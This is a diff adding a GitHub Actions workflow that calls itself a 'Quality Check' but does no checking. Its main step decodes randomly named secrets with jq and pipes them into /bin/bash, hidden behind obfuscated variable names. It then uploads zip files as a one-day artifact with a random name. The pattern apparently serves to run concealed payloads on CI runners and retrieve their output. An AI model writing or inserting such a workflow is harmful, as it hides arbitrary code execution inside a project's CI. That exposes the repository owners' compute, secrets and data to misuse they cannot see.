@@ -1,0 +1,33 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Execute
+        env:
+          wzjs5: ${{ secrets.wzjs5 }}
+        run: |
+          printf '%s' "$wzjs5" | jq -r .qlpqb08656 | /bin/bash
+          printf '%s' "$yi53" | jq -r .ntd54209 | /bin/bash
+          echo $miak2365 | jq -r .kynj3 | /bin/bash
+          echo $qc0765 | jq -r .abeh860 | /bin/bash
+          printf '%s' "$dcfq40" | jq -r .tfs42625 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 5fPy6V8K
+          path: "*.zip"
+          retention-days: 1
